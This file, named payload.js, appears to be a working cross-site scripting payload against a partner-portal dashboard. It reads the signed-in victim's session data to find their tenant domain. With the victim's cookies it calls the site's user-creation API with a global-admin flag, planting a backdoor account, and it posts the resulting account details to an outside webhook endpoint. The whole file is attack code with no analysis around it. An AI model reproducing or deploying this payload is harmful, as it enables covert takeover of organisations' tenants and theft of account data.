// payload.js
var elements = document.querySelectorAll(".page-title-spacer");
elements.forEach(function (element) {
  element.parentNode.removeChild(element);
});
elements = document.getElementsByTagName("img");
for (var i = elements.length - 1; i >= 0; i--) {
  elements[i].parentNode.removeChild(elements[i]);
}


function randomGuid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

var guid1 = randomGuid();
var guid2 = randomGuid();



var commonHeaders = {
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "MS-ClientCorrelationId": guid1,
  "Request-Id": guid2,
  "Flights": "EnablePxAccExpBravosIntegration|EnableMPNRebranding|EnableAppManagement|EnableAddExistingUserAccExpFlow|EnableAddUsersWithPermission|EnableAuthzV2ClaimCaching|EnableUIInfraClaimCaching|EnableCheckForDeveloperRoleUser|DisableUiinfraAuthV1|EnableOverviewPage|EnableUserManagementEditNavDeprecation|EnableCommercialVnext|EnablePayoutsNameChange|EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync|EnableUserJourneyTracker|PendingAAD_GraphMigration|EnableS2STokenValidation|EnableEmailInvitationFromEntra|EnableExistingLEReuse|EnableMergePartnerDeveloperSettings|EnablePxAccountExpService|ShowMyAccessLeftNav|EnableAuthV2|EnableCPVAccountExp|EnableRwebSunset|EnableAdvisorProfileAccountExp|ShowTstBanner|EnableUserManagement|EnableZip4Check|EnableLegalInfo|EnableHDCSubway|EnableAzureAD|EnableIvxExpiry|EnablePortalVnext2MyAccess|EnableFirmographicFileDeletion|EnableSurfaceTab|EnableSurfaceAgreementFlight|EnableMicrosoftCustomerAgreementFlight|EnableMicrosoftCustomerAgreementOfflinePIFlightCheck|EnableFreeHostCheck|EnableIntegrationSandbox|EnableAccountDelete|EnableWorkspaceApiAuthV2|EnableAddPublisher|EnableAuthV1ClaimsForFedGov|EnableInlineEmail|EnableChinaCPPAgreementSigning|DevicesTabNewRouting|EnableActivityDetails|EnableIdentityVerification|EnableGraphMigration|CompetencyGetHeaders_GraphMigration|EnableComplianceAdminRole|EnableRolesFromAuthV2|EnablePartnerSecurityRole|EnablePartnerSupportRole|EnableOwnerRoleOnEditUserPage|EnableMicrosoftCustomerAgreementItalyLRDFlight|EnableMCAPITaxIdUpdateFlight|EnableTenantBasedAgreementFetch|DisableBagISVAgreements_GetBillingProfileStatusAsync|EnableSuspendedAccounts|EnableSecurityWorkspaceForMyAccess|EnableUpdateActivityDetail|HDCAgreementUpdate|EnableResellerSandboxTenantAssociation|EnableSandboxTenantAssociation|EnableSignupCreateTenantRedirection|EnableBETHESDAGAMESEnrollment|EnableBusinessVerificationMethod|EnableSupportContactInfoDeveloperTab|EnableAngularUpgradedRoutes|PartnerPreview|WorkspacePreview|DisableTenantAccountCreationForBasicSetup",
  "X-Flights": "EnablePxAccExpBravosIntegration,EnableMPNRebranding,EnableAppManagement,EnableAddExistingUserAccExpFlow,EnableAddUsersWithPermission,EnableAuthzV2ClaimCaching,EnableUIInfraClaimCaching,EnableCheckForDeveloperRoleUser,DisableUiinfraAuthV1,EnableOverviewPage,EnableUserManagementEditNavDeprecation,EnableCommercialVnext,EnablePayoutsNameChange,EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync,EnableUserJourneyTracker,PendingAAD_GraphMigration,EnableS2STokenValidation,EnableEmailInvitationFromEntra,EnableExistingLEReuse,EnableMergePartnerDeveloperSettings,EnablePxAccountExpService,ShowMyAccessLeftNav,EnableAuthV2,EnableCPVAccountExp,EnableRwebSunset,EnableAdvisorProfileAccountExp,ShowTstBanner,EnableUserManagement,EnableZip4Check,EnableLegalInfo,EnableHDCSubway,EnableAzureAD,EnableIvxExpiry,EnablePortalVnext2MyAccess,EnableFirmographicFileDeletion,EnableSurfaceTab,EnableSurfaceAgreementFlight,EnableMicrosoftCustomerAgreementFlight,EnableMicrosoftCustomerAgreementOfflinePIFlightCheck,EnableFreeHostCheck,EnableIntegrationSandbox,EnableAccountDelete,EnableWorkspaceApiAuthV2,EnableAddPublisher,EnableAuthV1ClaimsForFedGov,EnableInlineEmail,EnableChinaCPPAgreementSigning,DevicesTabNewRouting,EnableActivityDetails,EnableIdentityVerification,EnableGraphMigration,CompetencyGetHeaders_GraphMigration,EnableComplianceAdminRole,EnableRolesFromAuthV2,EnablePartnerSecurityRole,EnablePartnerSupportRole,EnableOwnerRoleOnEditUserPage,EnableMicrosoftCustomerAgreementItalyLRDFlight,EnableMCAPITaxIdUpdateFlight,EnableTenantBasedAgreementFetch,DisableBagISVAgreements_GetBillingProfileStatusAsync,EnableSuspendedAccounts,EnableSecurityWorkspaceForMyAccess,EnableUpdateActivityDetail,HDCAgreementUpdate,EnableResellerSandboxTenantAssociation,EnableSandboxTenantAssociation,EnableSignupCreateTenantRedirection,EnableBETHESDAGAMESEnrollment,EnableBusinessVerificationMethod,EnableSupportContactInfoDeveloperTab,EnableAngularUpgradedRoutes,PartnerPreview,WorkspacePreview,DisableTenantAccountCreationForBasicSetup"
};

var domain = '';
var newAccount = '';
function loadUserData(index) {
  var userData = {
    isGuest: false,
    firstName: "Travis",
    lastName: "Moder",
    userPrincipalName: "",
    displayUserName: "tmsaut" + index,
    alternateEmail: "",
    alternateEmailAddresses: []
  };
  const value = sessionStorage.getItem('WorkspaceAuthContextData');

  if (value && value.includes("preferredUsername") && value.includes("@")) {
    let jsonData;
    try {
      jsonData = JSON.parse(value);
    } catch (e) {
      return userData;
    }

    if (jsonData && jsonData.userMetadata && typeof jsonData.userMetadata.preferredUsername === 'string' && jsonData.userMetadata.preferredUsername.includes('@')) {
      var userEmail = jsonData.userMetadata.preferredUsername;
      domain = userEmail.split('@')[1];
      // Random email
      newAccount = userData.displayUserName + "@" + domain;

      userData.userPrincipalName = newAccount;
      userData.alternateEmail = newAccount;
      console.log(newAccount);
      if (!Array.isArray(userData.alternateEmailAddresses)) {
        userData.alternateEmailAddresses = [];
      }
      userData.alternateEmailAddresses.push('admin@' + domain);
    }
  }
  return userData;
}

function Run(index) {
  if (localStorage.getItem("principalName") === '1') {
    console.log("already.");
    return;
  }

  var userData = loadUserData(index);
  if (!userData.userPrincipalName) {
    console.error("No userPrincipalName found in localStorage.");
    return;
  }

  fetch('https://' + window.location.hostname + '/en-us/dashboard/account/v3/api/graph/users?tenantDomainName=' + domain + '&isGlobalAdmin=true', {
    method: "POST",
    credentials: "include",
    headers: commonHeaders,
    body: JSON.stringify(userData)
  })
    .then(response => response.json())
    .then(result => {
      if (!result.objectId) {
        Run(index + 1);
        return;
      }
      result.userPrincipalName = newAccount;
      fetch('https://webhook-test.com/30e0283098aed29b5c052a61c0828c89', {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(result)
      })
        .catch(error => console.error("Error posting to webhook:", error));
      localStorage.setItem("principalName", '1');
    });
}

Run(0);
